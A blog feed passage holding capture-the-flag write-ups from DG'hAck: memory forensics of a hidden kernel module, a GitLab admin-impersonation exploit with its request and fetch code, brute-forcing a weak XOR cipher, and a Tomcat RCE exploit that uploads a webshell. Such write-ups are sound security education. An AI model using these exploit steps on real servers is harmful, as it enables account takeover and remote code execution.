Linuxdebiancustomx64 - A Profile &lt;span style="color:#66d9ef">for&lt;/span> Linux debiancustom x64
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="analyzing-the-image">Analyzing the image&lt;/h2>
&lt;p>At first glance, there doesn&amp;rsquo;t seem to be anything suspicious going on:&lt;/p>
&lt;ul>
&lt;li>no weird processes are running&lt;/li>
&lt;li>no suspicious files are present&lt;/li>
&lt;li>reading the logs don&amp;rsquo;t reveal anything&amp;hellip; or at least I thought so&lt;/li>
&lt;/ul>
&lt;p>I&amp;rsquo;m not sure how we were supposed to find this, but after trying a lot of the available commands, I discovered:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ volatility --profile&lt;span style="color:#f92672">=&lt;/span>Linuxdebiancustomx64 -f shadowmallet linux_hidden_modules
Volatility Foundation Volatility Framework 2.6.1
Offset &lt;span style="color:#f92672">(&lt;/span>V&lt;span style="color:#f92672">)&lt;/span> Name
------------------ ----
0xffffffffc04a6000 netfilter
0xffffffffc0578300 qni
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The netfilter module may be interesting, so let&amp;rsquo;s dump it:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ volatility --profile&lt;span style="color:#f92672">=&lt;/span>Linuxdebiancustomx64 -f shadowmallet linux_moddump -b 0xffffffffc04a6000 -D .
Volatility Foundation Volatility Framework 2.6.1
Wrote &lt;span style="color:#ae81ff">668514&lt;/span> bytes to netfilter.0xffffffffc04a6000.lkm
$ file netfilter.0xffffffffc04a6000.lkm
netfilter.0xffffffffc04a6000.lkm: ELF 64-bit LSB relocatable, Intel 80386, version &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">(&lt;/span>SYSV&lt;span style="color:#f92672">)&lt;/span>, BuildID&lt;span style="color:#f92672">[&lt;/span>sha1&lt;span style="color:#f92672">]=&lt;/span>43d8d77459d809b0337cbd723733ac10f8b582e8, not stripped
$ strings -n &lt;span style="color:#ae81ff">10&lt;/span> netfilter.0xffffffffc04a6000.lkm | head -n &lt;span style="color:#ae81ff">10&lt;/span>
4.19.0-9-amd64
&lt;span style="color:#f92672">[]&lt;/span>A&lt;span style="color:#ae81ff">\A&lt;/span>&lt;span style="color:#f92672">]&lt;/span>A^A_
&lt;span style="color:#f92672">[]&lt;/span>A&lt;span style="color:#ae81ff">\A&lt;/span>&lt;span style="color:#f92672">]&lt;/span>A^A_
YES SHA1 is CORRECT
B3tterR&lt;span style="color:#f92672">=&lt;/span>H1deMebeTT3r&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">then&lt;/span>!Right?
hook.cold.5
__func__.5155
__this_module
SHA1Update
cleanup_module
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And we find the flag, &lt;code>B3tterR=H1deMebeTT3r=then!Right?&lt;/code>. I guess we were supposed to find this using &lt;code>dmesg&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ volatility --profile&lt;span style="color:#f92672">=&lt;/span>Linuxdebiancustomx64 -f shadowmallet linux_dmesg | grep netfilter
Volatility Foundation Volatility Framework 2.6.1
&lt;span style="color:#f92672">[&lt;/span>1605821327.1&lt;span style="color:#f92672">]&lt;/span> netfilter: loading out-of-tree module taints kernel.
&lt;span style="color:#f92672">[&lt;/span>1605836480.1&lt;span style="color:#f92672">]&lt;/span> netfilter: module verification failed: signature and/or required key missing - tainting kernel
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Or maybe, since I see the string &lt;code>YES SHA1 is CORRECT&lt;/code>, using a SHA1 hash?&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Gitbad</title><link>https://nicolasb.fr/blog/writeup-dghack-gitbad/</link><pubDate>Sat, 28 Nov 2020 05:12:47 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-gitbad/</guid><description>This challenge takes place on a Gitlab instance, where we have to find private data. You start by creating an account, which is automatically validated after a few seconds. Once logged in, you can do a few things, for example:
create a project create a group edit your profile see the help page see public repositories Nothing seems to be particularly interesting, except for this message, on the help page:</description><content>&lt;p>This challenge takes place on a Gitlab instance, where we have to find private data. You start by creating an account, which is automatically validated after a few seconds. Once logged in, you can do a few things, for example:&lt;/p>
&lt;ul>
&lt;li>create a project&lt;/li>
&lt;li>create a group&lt;/li>
&lt;li>edit your profile&lt;/li>
&lt;li>see the help page&lt;/li>
&lt;li>see public repositories&lt;/li>
&lt;/ul>
&lt;p>Nothing seems to be particularly interesting, except for this message, on the help page:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/gitbad-update-asap.png">&lt;img src="https://nicolasb.fr/assets/dghack/gitbad-update-asap.png" alt="The help page showing an &amp;ldquo;update asap&amp;rdquo; message">&lt;/a>&lt;/p>
&lt;p>Searching for this version yields &lt;a href="https://www.exploit-db.com/exploits/40236">a very interesting CVE&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-markdown" data-lang="markdown">&lt;span style="color:#66d9ef">1.&lt;/span> Description
Any registered user can &amp;#34;log in&amp;#34; as any other user, including administrators.
https://about.gitlab.com/2016/05/02/cve-2016-4340-patches/
&lt;span style="color:#66d9ef">2.&lt;/span> Proof of Concept
Login as regular user.
Get current authenticity token by observing any POST-request (ex.: change any info in user profile).
Craft request using this as template:
POST /admin/users/stop_impersonation?id=root
. . .
_method=delete&amp;amp;authenticity_token=lqyOBt5U%2F0%2BPM2i%2BGDx3zaVjGgAqHzoteQ15FnrQ3E8%3D
Where &amp;#39;root&amp;#39; - desired user. &amp;#39;authenticity_token&amp;#39; - token obtained on the previous step.
&lt;span style="color:#66d9ef">3.&lt;/span> Solution:
Use officialy provided solutions:
https://about.gitlab.com/2016/05/02/cve-2016-4340-patches/
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This exploit allows us to login as someone else, as long as we have their username. But we don&amp;rsquo;t know the username of the administrator!&lt;/p>
&lt;p>Let&amp;rsquo;s look at the API documentation on the help page:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/gitbad-list-users.png">&lt;img src="https://nicolasb.fr/assets/dghack/gitbad-list-users.png" alt="The users list API endpoints">&lt;/a>&lt;/p>
&lt;p>Exactly what we need! To use it, we&amp;rsquo;ll need our &lt;code>private_token&lt;/code>, which can be found in our account settings. Navigating to:&lt;/p>
&lt;pre>&lt;code>http://gitbad2.chall.malicecyber.com/api/v3/users?private_token=a9qPQTK_3N9osyKKyqBy
&lt;/code>&lt;/pre>&lt;p>Gives us:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">[
{
&lt;span style="color:#f92672">&amp;#34;name&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;test&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;username&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;test&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">5&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;state&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;active&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;avatar_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://www.gravatar.com/avatar/b642b4217b34b1e8d3bd915fc65c4452?s=80&amp;amp;d=identicon&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;web_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://b35923e21b4a/u/test&amp;#34;&lt;/span>
},
{
&lt;span style="color:#f92672">&amp;#34;name&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;stephan&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;username&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;stephan&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">4&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;state&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;active&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;avatar_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://www.gravatar.com/avatar/5222db2651f07bd3ba821b15c08bbdf5?s=80&amp;amp;d=identicon&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;web_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://b35923e21b4a/u/stephan&amp;#34;&lt;/span>
},
{
&lt;span style="color:#f92672">&amp;#34;name&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;Kris&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;username&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;Kris&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">3&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;state&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;active&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;avatar_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://www.gravatar.com/avatar/7d1c587c79d19087bae4e15c5362c5fb?s=80&amp;amp;d=identicon&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;web_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://b35923e21b4a/u/Kris&amp;#34;&lt;/span>
},
{
&lt;span style="color:#f92672">&amp;#34;name&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;bobby&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;username&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;bobby&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">2&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;state&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;active&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;avatar_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://www.gravatar.com/avatar/c7fa9756c768cb88d639ad16761fc8de?s=80&amp;amp;d=identicon&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;web_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://b35923e21b4a/u/bobby&amp;#34;&lt;/span>
},
{
&lt;span style="color:#f92672">&amp;#34;name&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;Administrator&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;username&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;8e4684f1498aad818870376301b15426&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;state&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;active&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;avatar_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://www.gravatar.com/avatar/e64c7d89f26bd1972efa854d13d7dd61?s=80&amp;amp;d=identicon&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;web_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://b35923e21b4a/u/8e4684f1498aad818870376301b15426&amp;#34;&lt;/span>
}
]
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we go, the username of the administrator is &lt;code>8e4684f1498aad818870376301b15426&lt;/code>. We just have to use the exploit we found. I made the request using &lt;code>fetch&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">form&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">FormData&lt;/span>();
&lt;span style="color:#a6e22e">form&lt;/span>.&lt;span style="color:#a6e22e">append&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;_method&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;delete&amp;#34;&lt;/span>);
&lt;span style="color:#a6e22e">form&lt;/span>.&lt;span style="color:#a6e22e">append&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;authenticity_token&amp;#34;&lt;/span>, document.&lt;span style="color:#a6e22e">querySelector&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;meta[name=csrf-token]&amp;#39;&lt;/span>).&lt;span style="color:#a6e22e">content&lt;/span>);
&lt;span style="color:#a6e22e">await&lt;/span> &lt;span style="color:#a6e22e">fetch&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;http://gitbad2.chall.malicecyber.com/admin/users/stop_impersonation?id=8e4684f1498aad818870376301b15426&amp;#34;&lt;/span>, {
&lt;span style="color:#e6db74">&amp;#34;body&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">form&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;method&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;POST&amp;#34;&lt;/span>,
});
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The request was a bit tricky to get right, for example I initially thought that I had to post URL encoded params.&lt;/p>
&lt;p>Entering this little script in our console gives us access to the admin area:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/gitbad-admin-area.png">&lt;img src="https://nicolasb.fr/assets/dghack/gitbad-admin-area.png" alt="The admin area">&lt;/a>&lt;/p>
&lt;p>A repo instantly stands out from the rest: &lt;code>stephan/my-secret-project&lt;/code>. Reading the code reveals it&amp;rsquo;s a collection of python scripts. The commit history has a particularly suspicious one, called &lt;code>added my private key&lt;/code>:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/gitbad-suspicious-commit.png">&lt;img src="https://nicolasb.fr/assets/dghack/gitbad-suspicious-commit.png" alt="A suspicious commit">&lt;/a>&lt;/p>
&lt;p>The flag is &lt;code>W3lL-d0N3-y0u-w1n-a_c4ke!&lt;/code>.&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Involucrypt 1</title><link>https://nicolasb.fr/blog/writeup-dghack-involucrypt-1/</link><pubDate>Fri, 20 Nov 2020 00:27:19 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-involucrypt-1/</guid><description>This writeup uses a naive approach, see my writeup of involucrypt 2 for a better solution.
The challenge starts off with two files:
crypt.py involucrypt1 The first one is a script that can encode a message, the second one contains crypted data.
Here is the (slightly redacted) script:
import itertools import operator import sys BLOCK = 150 class mersenne_rng(object): ... def keystream(seeds, length, base=None): key = base if base else [] for seed in seeds: random = mersenne_rng(seed) for _ in range(BLOCK): if len(key) == length: break key.</description><content>&lt;p>&lt;em>This writeup uses a naive approach, see my &lt;a href="https://nicolasb.fr/blog/writeup-dghack-involucrypt-2/">writeup of involucrypt 2&lt;/a> for a better solution.&lt;/em>&lt;/p>
&lt;p>The challenge starts off with two files:&lt;/p>
&lt;ul>
&lt;li>&lt;code>crypt.py&lt;/code>&lt;/li>
&lt;li>&lt;code>involucrypt1&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>The first one is a script that can encode a message, the second one contains crypted data.&lt;/p>
&lt;p>Here is the (slightly redacted) script:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> itertools
&lt;span style="color:#f92672">import&lt;/span> operator
&lt;span style="color:#f92672">import&lt;/span> sys
BLOCK &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">150&lt;/span>
&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">mersenne_rng&lt;/span>(object):
&lt;span style="color:#f92672">...&lt;/span>
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">keystream&lt;/span>(seeds, length, base&lt;span style="color:#f92672">=&lt;/span>None):
key &lt;span style="color:#f92672">=&lt;/span> base &lt;span style="color:#66d9ef">if&lt;/span> base &lt;span style="color:#66d9ef">else&lt;/span> []
&lt;span style="color:#66d9ef">for&lt;/span> seed &lt;span style="color:#f92672">in&lt;/span> seeds:
random &lt;span style="color:#f92672">=&lt;/span> mersenne_rng(seed)
&lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(BLOCK):
&lt;span style="color:#66d9ef">if&lt;/span> len(key) &lt;span style="color:#f92672">==&lt;/span> length:
&lt;span style="color:#66d9ef">break&lt;/span>
key&lt;span style="color:#f92672">.&lt;/span>append(random&lt;span style="color:#f92672">.&lt;/span>get_rand_int(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">255&lt;/span>))
random&lt;span style="color:#f92672">.&lt;/span>shuffle(key)
&lt;span style="color:#66d9ef">if&lt;/span> len(key) &lt;span style="color:#f92672">==&lt;/span> length:
&lt;span style="color:#66d9ef">break&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> key
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">encrypt&lt;/span>(string, key):
key &lt;span style="color:#f92672">=&lt;/span> keystream(map(ord, key), len(string))
stream &lt;span style="color:#f92672">=&lt;/span> itertools&lt;span style="color:#f92672">.&lt;/span>starmap(operator&lt;span style="color:#f92672">.&lt;/span>xor, zip(key, map(ord, string)))
&lt;span style="color:#66d9ef">return&lt;/span> bytearray(stream)
&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
&lt;span style="color:#66d9ef">if&lt;/span> sys&lt;span style="color:#f92672">.&lt;/span>version_info &lt;span style="color:#f92672">&amp;gt;=&lt;/span> (&lt;span style="color:#ae81ff">3&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>):
sys&lt;span style="color:#f92672">.&lt;/span>stdout&lt;span style="color:#f92672">.&lt;/span>buffer&lt;span style="color:#f92672">.&lt;/span>write(encrypt(sys&lt;span style="color:#f92672">.&lt;/span>stdin&lt;span style="color:#f92672">.&lt;/span>read(), sys&lt;span style="color:#f92672">.&lt;/span>argv[&lt;span style="color:#ae81ff">1&lt;/span>]))
&lt;span style="color:#66d9ef">else&lt;/span>:
sys&lt;span style="color:#f92672">.&lt;/span>stdout&lt;span style="color:#f92672">.&lt;/span>write(encrypt(sys&lt;span style="color:#f92672">.&lt;/span>stdin&lt;span style="color:#f92672">.&lt;/span>read(), sys&lt;span style="color:#f92672">.&lt;/span>argv[&lt;span style="color:#ae81ff">1&lt;/span>]))
&lt;/code>&lt;/pre>&lt;/div>&lt;p>I omitted the &lt;code>mersenne_rng&lt;/code> class: you don&amp;rsquo;t need it to solve the challenge. It&amp;rsquo;s a particular type of RNG, the one used by python2. Since the script is cross-version, I think it&amp;rsquo;s just there to ensure coherent results.&lt;/p>
&lt;p>The encryption consists in XORing the input data with an array of integers, which is generated by the &lt;code>keystream&lt;/code> function. This stream is composed of different blocks of 150 integers. Each block corresponds to a letter of the key, whose ASCII code is used to seed the RNG that generates the block integers.&lt;/p>
&lt;p>The tricky part is that after adding an integer to the stream (called &lt;code>key&lt;/code> here), it is shuffled:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">key&lt;span style="color:#f92672">.&lt;/span>append(random&lt;span style="color:#f92672">.&lt;/span>get_rand_int(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">255&lt;/span>))
random&lt;span style="color:#f92672">.&lt;/span>shuffle(key)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This makes brute-forcing the blocks independently pretty hard. Fortunately, we don&amp;rsquo;t have to!&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ wc -c involucrypt1
&lt;span style="color:#ae81ff">370&lt;/span> involucrypt1
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The file is 370 bytes long, so the key must be 3 chars long (370 divided by 150 is 2.47). This is really short, so let&amp;rsquo;s brute-force it!&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> math
&lt;span style="color:#f92672">import&lt;/span> string
&lt;span style="color:#f92672">import&lt;/span> itertools
&lt;span style="color:#75715e"># Note: I renamed the script `crypt.py` to `ccrypt.py`, to avoid naming issues.&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> ccrypt &lt;span style="color:#f92672">import&lt;/span> keystream
ALPHA &lt;span style="color:#f92672">=&lt;/span> string&lt;span style="color:#f92672">.&lt;/span>ascii_lowercase
&lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;involucrypt1&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;rb&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
data &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>read()
block_count &lt;span style="color:#f92672">=&lt;/span> math&lt;span style="color:#f92672">.&lt;/span>ceil(len(data) &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">150&lt;/span>)
iterations &lt;span style="color:#f92672">=&lt;/span> len(ALPHA) &lt;span style="color:#f92672">**&lt;/span> block_count
&lt;span style="color:#66d9ef">for&lt;/span> index, key &lt;span style="color:#f92672">in&lt;/span> enumerate(itertools&lt;span style="color:#f92672">.&lt;/span>product(ALPHA, repeat&lt;span style="color:#f92672">=&lt;/span>block_count)):
percent &lt;span style="color:#f92672">=&lt;/span> index &lt;span style="color:#f92672">/&lt;/span> iterations &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>
&lt;span style="color:#66d9ef">print&lt;/span>(
f&lt;span style="color:#e6db74">&amp;#34;{percent:.2f}% ({index} / {iterations}) : &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(key),
end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\r&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>,
flush&lt;span style="color:#f92672">=&lt;/span>True,
)
key &lt;span style="color:#f92672">=&lt;/span> keystream(map(ord, key), len(data))
decoded &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
valid &lt;span style="color:#f92672">=&lt;/span> True
&lt;span style="color:#66d9ef">for&lt;/span> char_key, char &lt;span style="color:#f92672">in&lt;/span> zip(key, data):
decoded_char &lt;span style="color:#f92672">=&lt;/span> chr(char_key &lt;span style="color:#f92672">^&lt;/span> char)
&lt;span style="color:#66d9ef">if&lt;/span> decoded_char &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> string&lt;span style="color:#f92672">.&lt;/span>printable:
valid &lt;span style="color:#f92672">=&lt;/span> False
&lt;span style="color:#66d9ef">break&lt;/span>
decoded &lt;span style="color:#f92672">+=&lt;/span> decoded_char
&lt;span style="color:#66d9ef">if&lt;/span> valid:
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">print&lt;/span>(decoded)
&lt;span style="color:#66d9ef">break&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After a second and a half (thanks to &lt;a href="https://www.pypy.org/">pypy3&lt;/a>) short seconds, we see :&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ pypy3 brute_1.py involucrypt1
1.95% &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">342&lt;/span> / 17576&lt;span style="color:#f92672">)&lt;/span> : ane
The flag is: TheKeyIsTooDamnWeak!
Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed &lt;span style="color:#66d9ef">do&lt;/span> eiusmod tempor
incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud
exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure
dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.
&lt;/code>&lt;/pre>&lt;/div>&lt;p>I assumed the key was only made up of lowercase letters, but if the bruteforce didn&amp;rsquo;t work, I would have started it again with &lt;code>ALPHA = string.printable&lt;/code>.&lt;/p>
&lt;p>The key is &lt;code>ane&lt;/code>, and the flag is &lt;code>TheKeyIsTooDamnWeak!&lt;/code>. See my &lt;a href="https://nicolasb.fr/blog/writeup-dghack-involucrypt-2/">writeup of involucrypt 2&lt;/a> for a better solution.&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Walters Blog</title><link>https://nicolasb.fr/blog/writeup-dghack-walters-blog/</link><pubDate>Thu, 19 Nov 2020 05:56:46 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-walters-blog/</guid><description>The challenge starts with a minecraft blog:
None of the pages look vulnerable. The URLs themselves don&amp;rsquo;t have any parameters, it&amp;rsquo;s just some static html (eg: /contact.html). The contact form doesn&amp;rsquo;t work: when posting something we get a 404.
On that same 404 page, we can notice the apache version:
Apache Tomcat/9.0.0.M1 Searching for that version on google tells us that this particular version is vulnerable to a RCE. The exploit is available on exploit database.</description><content>&lt;p>The challenge starts with a minecraft blog:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/walters-blog-home.png">&lt;img src="https://nicolasb.fr/assets/dghack/walters-blog-home.png" alt="The homepage">&lt;/a>&lt;/p>
&lt;p>None of the pages look vulnerable. The URLs themselves don&amp;rsquo;t have any parameters, it&amp;rsquo;s just some static html (eg: &lt;code>/contact.html&lt;/code>). The contact form doesn&amp;rsquo;t work: when posting something we get a 404.&lt;/p>
&lt;p>On that same 404 page, we can notice the apache version:&lt;/p>
&lt;pre>&lt;code>Apache Tomcat/9.0.0.M1
&lt;/code>&lt;/pre>&lt;p>Searching for that version on google tells us that this particular version is vulnerable to a RCE. The exploit is available on &lt;a href="https://www.exploit-db.com/exploits/42966">exploit database&lt;/a>.&lt;/p>
&lt;p>Let&amp;rsquo;s use it:&lt;/p>
&lt;pre>&lt;code>$ wget https://www.exploit-db.com/raw/42966
$ python2 42966 -p pwn -u http://waltersblog3.chall.malicecyber.com
_______ ________ ___ ___ __ ______ __ ___ __ __ ______
/ ____\ \ / / ____| |__ \ / _ \/_ |____ | /_ |__ \ / //_ |____ |
| | \ \ / /| |__ ______ ) | | | || | / /_____| | ) / /_ | | / /
| | \ \/ / | __|______/ /| | | || | / /______| | / / '_ \| | / /
| |____ \ / | |____ / /_| |_| || | / / | |/ /| (_) | | / /
\_____| \/ |______| |____|\___/ |_|/_/ |_|____\___/|_|/_/
[@intx0x80]
Uploading Webshell .....
$ ls
bin
boot
dev
entrypoint.sh
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
supervisord.log
supervisord.pid
sys
tmp
usr
var
$ cat flag.txt
flag{i4lW4y5UpD4T3Y0urt0mC@}
&lt;/code>&lt;/pre>&lt;p>And there we go, the flag is &lt;code>i4lW4y5UpD4T3Y0urt0mC@&lt;/code>.&lt;/p>
&lt;hr>
